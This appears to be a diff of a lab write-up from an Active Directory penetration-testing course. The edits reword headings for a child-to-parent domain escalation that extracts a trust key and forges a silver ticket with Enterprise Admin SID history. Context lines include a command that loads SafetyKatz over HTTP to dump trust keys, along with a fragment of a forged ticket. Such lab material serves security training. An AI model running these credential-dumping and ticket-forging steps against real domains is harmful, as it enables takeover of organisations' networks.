@@ -9,15 +9,15 @@
 ## Attack Path Steps
 
 - **Access to the Child DC with DA Privileges**
-- **Extract the Trust Key for the Parent Domain from the Child DC**
-- **Forge a Silver Ticket with EA SID History using the Trust Key from the Child DC for Privilege Escalation**
-- **Leverage the Forged Ticket to Gain EA Access on the Parent DC**
+- **Extract from the Child DC the Trust Key for the Parent Domain**
+- **Forge a Silver Ticket (with EA SID History) using the Trust Key from the Child DC for Privilege Escalation**
+- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**
 
 ---
 
 ## Solution
 
-1. **Using DA access to `dollarcorp.moneycorp.local`, escalate privileges to EA using the domain trust key**
+1. **Using DA access to `dollarcorp.moneycorp.local`, extract the trust key for `moneycorp.local` and escalate privileges to EA by forging a silver ticket**
 
 - **Access to the Child DC with DA Privileges**
 
@@ -118,7 +118,7 @@ C:\Users\svcadmin>
 
 ![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_18_hfs_safetykatz.png)
 
-- **Extract the Trust Key for the Parent Domain from the Child DC**
+- **Extract from the Child DC the Trust Key for the Parent Domain**
 
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"`:
 ```
@@ -138,7 +138,7 @@ Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-335606122-960912869-3279953914)
 [SNIP]
 ```
 
-- **Forge a Silver Ticket with EA SID History using the Trust Key from the Child DC for Privilege Escalation**
+- **Forge a Silver Ticket (with EA SID History) using the Trust Key from the Child DC for Privilege Escalation**
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
@@ -199,7 +199,7 @@ doIGPjCCBjqgAwIBBaEDAgEWooIFCjCCBQZhggUCMIIE/qADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
 [SNIP]
 ```
 
-- **Leverage the Forged Ticket to Gain EA Access on the Parent DC**
+- **Leverage the Forged Ticket to Gain EA Access to the Parent DC**
 
 Copy the base64 encoded ticket from above and use it in the following command.
 
